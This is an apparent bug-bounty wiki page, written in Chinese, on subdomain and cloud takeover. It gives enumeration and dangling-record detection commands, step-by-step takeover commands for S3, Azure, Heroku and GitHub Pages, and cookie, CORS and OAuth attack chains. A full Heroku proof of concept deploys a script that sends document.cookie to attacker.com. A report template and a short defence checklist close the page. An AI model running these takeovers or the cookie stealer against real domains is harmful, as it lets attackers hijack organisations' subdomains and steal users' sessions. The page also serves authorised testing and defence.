---
type: wiki
category: attack
tool: subzy,dnsreaper,nuclei
status: active
last-updated: 2026-04-21
---

# Subdomain / Cloud Takeover 深度（2026 版）

> **用途：** Dangling CNAME / unclaimed S3 bucket = P2-P1（取決於 subdomain 信任度）。2026 年 AWS 加強 S3 bucket namespace 回收保護，但 Azure/GCP/Heroku/Fastly 仍有 gap。`apex.target.com` 接管 > session cookie scoped 上來 = 完整 ATO。

## 0. 2026 現況

| Provider | 2026 狀態 | 可利用性 |
|----------|----------|---------|
| S3 | 有 bucket namespace pre-claim（2022+）| 低，但 legacy bucket 仍可 |
| Azure blob | 名稱釋放後可 re-claim | 中 |
| Heroku | 子網域釋放後可直接 `heroku apps:create` | 高 |
| GitHub Pages | user/repo 刪除後可 re-register | 高 |
| Netlify / Vercel | 可宣告 | 高 |
| Fastly | **需帳號且 edge condition**，`can-i-take-over-xyz` 官方 = Not Vulnerable | 極低 |
| Shopify | 多層驗證（DNS TXT）| 低 |
| Pantheon | 可接管 | 中 |

官方表：https://github.com/EdOverflow/can-i-take-over-xyz

## 1. 找候選

### 1.1 DNS 枚舉全 subdomain

```bash
# 被動（推薦，量大）
subfinder -d target.com -all -silent | tee all.txt
amass enum -passive -d target.com | tee -a all.txt
assetfinder target.com | tee -a all.txt
findomain -t target.com

# BBOT one-liner
bbot -t target.com -f subdomain-enum -o bbot-out

# Certificate transparency
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u
```

### 1.2 Resolve → 找 CNAME / NXDOMAIN

```bash
# dnsx 查 CNAME
cat all.txt | dnsx -cname -resp -silent | tee cnames.txt

# 抓出指向外部的 CNAME
grep -E 'cname.*(s3|azurewebsites|cloudapp|herokuapp|herokussl|github\.io|netlify|vercel|pantheon|elasticbeanstalk|fastly)' cnames.txt
```

### 1.3 找 NXDOMAIN（CNAME 指向不存在 host）

```bash
cat all.txt | dnsx -resp | grep NXDOMAIN
```

## 2. 自動化工具

### 2.1 subzy（快）

```bash
go install -v github.com/LukaSikic/subzy@latest
subzy run --targets all.txt --concurrency 100 --hide_fails --verify_ssl
```

### 2.2 dnsReaper（最完整 fingerprint）

```bash
git clone https://github.com/punk-security/dnsReaper
cd dnsReaper
pip install -r requirements.txt
python3 main.py file --filename ../all.txt -o findings.json
```

### 2.3 Nuclei takeover templates

```bash
nuclei -l all.txt -tags takeover -silent
```

### 2.4 tko-subs

```bash
tko-subs -domains=all.txt -data=providers-data.csv
```

## 3. S3 Bucket Takeover

### 3.1 偵測

```bash
# CNAME 指向 s3.amazonaws.com 或 s3-website-xxx
dig cdn.target.com
# → cdn.target.com.s3.amazonaws.com

curl -sI https://cdn.target.com/
# → NoSuchBucket error = 可接管
```

### 3.2 接管（2026 注意）

```bash
# 試 create bucket in same region
aws s3 mb s3://cdn.target.com --region us-east-1

# 2022+ AWS 有 namespace cooldown，多數 region 會拒絕
# 但 legacy bucket 仍可成功

# 上傳檔案
echo '<html><h1>owned</h1></html>' > index.html
aws s3 cp index.html s3://cdn.target.com/
aws s3 website s3://cdn.target.com/ --index-document index.html

# 測試
curl https://cdn.target.com/
```

### 3.3 S3 bucket enumeration（找公開 bucket）

```bash
# 不需接管也可能有 IDOR / data exposure
s3scanner scan -f bucket-list.txt
cloud_enum -k target
```

## 4. Azure Blob Takeover

### 4.1 偵測

```bash
# CNAME 指向 *.blob.core.windows.net
dig media.target.com
# → media.target.com.blob.core.windows.net

curl -sI https://media.target.com/
# → "The requested URI does not represent..." = 可接管
```

### 4.2 接管

```bash
# Azure CLI
az storage account create \
  --name mediatarget \
  --resource-group my-rg \
  --location eastus \
  --sku Standard_LRS

# Custom domain
az storage account update \
  --name mediatarget \
  --custom-domain media.target.com
```

## 5. Heroku Takeover（高成功率）

```bash
# CNAME 指向 *.herokuapp.com 或 *.herokudns.com
dig app.target.com
# → app.target.com.herokuapp.com

curl https://app.target.com/
# → "No such app" = 可接管
```

接管：

```bash
heroku login
heroku create app-target     # 用 CNAME 指向的 app 名
heroku domains:add app.target.com
git push heroku main
```

## 6. GitHub Pages Takeover

```bash
# CNAME 指向 user.github.io
dig blog.target.com
# → blog.target.com.oldcompany.github.io

curl https://blog.target.com/
# → "There isn't a GitHub Pages site here" = 可接管
```

接管：

1. 註冊 GitHub user `oldcompany` 或建 repo `oldcompany.github.io`
2. 新增 `CNAME` 檔案內容 `blog.target.com`
3. 觸發 Pages build

## 7. 其他 provider

### 7.1 Netlify / Vercel

```
curl → "Page Not Found" + Netlify logo = 可 claim
```

Netlify `Domain Management → Add a custom domain → blog.target.com`。

### 7.2 Pantheon

```
curl → "The gods are wise, but do not know of the site which you seek"
```

### 7.3 Fastly（2026 基本免疫）

```
curl → "Fastly error: unknown domain"
```

但 `can-i-take-over-xyz` 分類 **Not Vulnerable**（需 account 且 edge 條件）。除非有新 PoC，否則**不要送**，大廠會 N/A。Under Armour 2026-04 驗過：需要 Fastly paid account 才能 claim 任意網域，實戰不可行。

### 7.4 Tumblr / Shopify / Zendesk

多數需 DNS TXT 驗證，已 patch。

## 8. Apex / 高信任 domain 攻擊鏈

### 8.1 session cookie scope 上升

```
main.target.com → sets cookie with Domain=.target.com
attacker 接管 random.target.com
→ 把 iframe/fetch 寫進 random.target.com
→ session cookie 在同 parent domain 會被送達
→ 可讀 / 覆寫
```

### 8.2 CORS allowlist bypass

若 CORS 白單 `*.target.com`，takeover 任一 subdomain → 可打 main API。

### 8.3 OAuth `redirect_uri` bypass

若 OAuth 登記 `*.target.com` 為合法 redirect → 接管 subdomain → 拿 code。

詳見 [16-oauth-attack-chains.md](16-oauth-attack-chains.md)。

### 8.4 Cookie injection via subdomain

攻擊者控制 sub.target.com → set cookie with Domain=.target.com → 覆寫 parent cookie（CSRF、session fixation）。

## 9. 完整 PoC：Heroku subdomain takeover → session cookie theft

### Step 1: 偵測

```bash
$ dig oldapp.target.com
oldapp.target.com. 300 IN CNAME target-legacy.herokuapp.com.

$ curl -s https://oldapp.target.com/
There's nothing here, yet.
```

### Step 2: 接管

```bash
heroku create target-legacy
heroku domains:add oldapp.target.com

# 建簡單 app
echo 'console.log("owned")' > index.js
echo '{"name":"x","scripts":{"start":"node index.js"}}' > package.json
git init && git add . && git commit -m init
heroku git:remote -a target-legacy
git push heroku master
```

### Step 3: 部署 session stealer

```js
// 在接管的 subdomain 部署
<script>
  if (document.cookie) {
    fetch('https://attacker.com/log?c=' + encodeURIComponent(document.cookie));
  }
</script>
```

### Step 4: 驗證 cookie scope

```bash
curl -b "sessionId=test" https://oldapp.target.com/
# 若 main.target.com 的 cookie Domain=.target.com → 也會送
```

### Step 5: 報告

```markdown
## 漏洞概述
https://oldapp.target.com 的 DNS CNAME 指向已釋放的 Heroku app
`target-legacy.herokuapp.com`，任意攻擊者可在 Heroku 重新註冊同名
app 並接管此子網域。由於 target.com 的 session cookie Domain 設為
`.target.com`，此接管可用於竊取所有 subdomain 使用者的 session，
達成帳號接管。

## PoC
[3 步驟：dig 確認 + heroku create + 部署 POC 頁面 + cookie 竊取日誌]

## Impact
- 任意使用者 session 竊取（scope 到 *.target.com）
- Phishing 高信任載體（真實子網域）
- 若 CORS 白單 *.target.com → 可打內部 API

## Severity
P1 / Critical（session cookie scope 到 parent）
P2 / High（純 subdomain takeover 無 session impact）

## 修補
1. 立即刪除 DNS CNAME oldapp.target.com
2. 或在 Heroku 註冊 placeholder app
3. Audit 所有 DNS：對比 actual infra inventory
4. 建立 dangling record 監控（dnsReaper 排程）
5. Session cookie 改用具體 subdomain scope，不用 parent
```

## 10. 防禦 checklist

```
1. DNS record 生命週期與 infra inventory 對齊
2. 停用服務時先移除 DNS，再 decommission
3. 自動化 takeover 掃描（subzy cron）
4. Session cookie Domain 儘量用具體 subdomain
5. CORS 白單用 exact match，不用 wildcard
6. OAuth redirect_uri exact match
7. S3 bucket 啟用 Block Public Access
8. 所有 cloud asset 加 resource tag → 離職 / 結束專案時批次檢查
```

## 關聯文件

- [16-oauth-attack-chains.md](16-oauth-attack-chains.md) — OAuth redirect_uri bypass
- [78-open-redirect.md](78-open-redirect.md) — Subdomain takeover 配合 OAuth
- can-i-take-over-xyz：https://github.com/EdOverflow/can-i-take-over-xyz
- subzy：https://github.com/LukaSikic/subzy
- dnsReaper：https://github.com/punk-security/dnsReaper
- tko-subs：https://github.com/anshumanbh/tko-subs
- HackerOne 歷史 takeover reports：https://github.com/EdOverflow/can-i-take-over-xyz/blob/master/README.md
